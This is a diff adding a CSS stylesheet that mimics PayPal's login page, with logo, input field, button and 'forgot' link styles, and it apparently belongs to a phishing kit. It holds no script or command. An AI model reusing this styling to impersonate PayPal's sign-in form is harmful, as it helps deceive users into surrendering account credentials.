@@ -1,0 +1,170 @@
+.paypal-logo {
+background: transparent url('ppcom.svg') top center no-repeat;
+background-size: 129px 32px;
+width: 129px;
+height: 32px;
+display: block;
+text-indent: -999em;
+}
+
+.textInput input:focus {
+box-shadow: 0 0 5px #009cde;
+border:1px solid #009cde;
+}
+.contentContainer {
+margin: 65px auto 0;
+position: relative;
+padding: 70px;
+background-color: #F7F9FA;
+-webkit-border-radius: 5px;
+-moz-border-radius: 5px;
+-khtml-border-radius: 5px;
+border-radius: 5px;
+}
+.notifications .notification.notification-critical {
+background-color: #fff7f7;
+background-position: left 12px top -387px;
+border-color: #c72e2e;
+}
+.notifications .notification {
+margin-top: 0;
+padding: 15px 15px 15px 44px;
+-webkit-border-radius: 5px;
+-moz-border-radius: 5px;
+-khtml-border-radius: 5px;
+border-radius: 5px;
+border-width: 1px;
+border-style: solid;
+text-align: left;
+font-size: 1em;
+background: url(https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png) no-repeat;
+background-size: 20px;
+}
+.contentContainer header .paypal-logo {
+margin: 0 auto;
+}
+.textInput input, .textInput textarea {
+height: 40px;
+width: 100%;
+padding: 0 10px;
+border: 1px solid #9da3a6;
+background: #fff;
+text-overflow: ellipsis;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+-webkit-border-radius: 5px;
+-moz-border-radius: 5px;
+-khtml-border-radius: 5px;
+border-radius: 5px;
+-webkit-box-shadow: none;
+-moz-box-shadow: none;
+box-shadow: none;
+color: #000;
+font-size: 1em;
+font-family: Helvetica,Arial,sans-serif;
+font-weight: 400;
+}
+.contentContainer header {
+padding: 0 0 35px;
+}
+.textInput input:not([type=submit]):not([type=radio]):not([type=checkbox]) {
+-webkit-background-clip: padding-box;
+-moz-background-clip: padding-box;
+background-clip: padding-box;
+-webkit-transition: border .2s ease-in-out,background-color .2s ease-in-out;
+-moz-transition: border .2s ease-in-out,background-color .2s ease-in-out;
+-o-transition: border .2s ease-in-out,background-color .2s ease-in-out;
+transition: border .2s ease-in-out,background-color .2s ease-in-out;
+outline: none;
+}
+a.button, a.button:link, a.button:visited, .button {
+width: 100%;
+height: 44px;
+padding: 0;
+border: 0;
+display: block;
+background-color: #009cde;
+-webkit-box-shadow: none;
+-moz-box-shadow: none;
+box-shadow: none;
+-webkit-border-radius: 5px;
+-moz-border-radius: 5px;
+-khtml-border-radius: 5px;
+border-radius: 5px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+cursor: pointer;
+-webkit-appearance: none;
+-moz-appearance: none;
+-ms-appearance: none;
+-o-appearance: none;
+appearance: none;
+-webkit-tap-highlight-color: transparent;
+color: #fff;
+font-size: 1em;
+text-align: center;
+font-weight: 700;
+font-family: HelveticaNeue,"Helvetica Neue",HelveticaNeue-Light,"Helvetica Neue Light",Helvetica,Arial,sans-serif;
+text-shadow: none;
+text-decoration: none;
+-webkit-transition: background-color .4s ease-out;
+-moz-transition: background-color .4s ease-out;
+-o-transition: background-color .4s ease-out;
+transition: background-color .4s ease-out;
+-webkit-font-smoothing: antialiased;
+}
+a.button:hover, a.button:link:hover, a.button:visited:hover, .button:hover, a.button:focus, a.button:link:focus, a.button:visited:focus, .button:focus {
+background-color: #008ac5;
+text-decoration: underline;
+outline: 0;
+}
+.textInput {
+position: relative;
+margin: 0 0 10px;
+}
+a.button.active, a.button:link.active, a.button:visited.active, .button.active, a.button:active, a.button:link:active, a.button:visited:active, .button:active {
+background: #00598e;
+}
+a, a:link, a:visited {
+color: #009cde;
+font-family: HelveticaNeue,"Helvetica Neue",HelveticaNeue-Light,"Helvetica Neue Light",Helvetica,Arial,sans-serif;
+font-weight: 400;
+text-decoration: none;
+-webkit-transition: color .2s ease-out;
+-moz-transition: color .2s ease-out;
+-o-transition: color .2s ease-out;
+transition: color .2s ease-out;
+}
+a, a:link, a:visited {
+color: #009cde;
+font-family: HelveticaNeue,"Helvetica Neue",HelveticaNeue-Light,"Helvetica Neue Light",Helvetica,Arial,sans-serif;
+font-weight: 400;
+text-decoration: none;
+-webkit-transition: color .2s ease-out;
+-moz-transition: color .2s ease-out;
+-o-transition: color .2s ease-out;
+transition: color .2s ease-out;
+}
+a, a:link, a:visited {
+color: #009cde;
+font-family: HelveticaNeue,"Helvetica Neue",HelveticaNeue-Light,"Helvetica Neue Light",Helvetica,Arial,sans-serif;
+font-weight: 400;
+text-decoration: none;
+-webkit-transition: color .2s ease-out;
+-moz-transition: color .2s ease-out;
+-o-transition: color .2s ease-out;
+transition: color .2s ease-out;
+}
+.forgotLink {
+margin: 25px auto 0;
+padding-bottom: 25px;
+border-bottom: 1px solid #cbd2d6;
+text-align: center;
+}
+* {
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+}
